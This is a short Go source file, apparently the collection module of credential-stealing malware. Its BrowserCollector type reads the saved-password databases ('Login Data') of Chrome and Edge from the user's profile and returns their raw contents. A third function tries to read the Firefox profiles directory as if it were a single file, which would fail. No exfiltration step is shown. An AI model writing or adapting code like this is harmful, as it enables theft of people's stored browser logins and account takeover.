package collector

import (
"os"
"path/filepath"
)

type BrowserCollector struct{}

func NewBrowserCollector() *BrowserCollector {
return &BrowserCollector{}
}

func (b *BrowserCollector) ExtractChrome() (string, error) {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}

func (b *BrowserCollector) ExtractFirefox() (string, error) {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}

func (b *BrowserCollector) ExtractEdge() (string, error) {
path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}
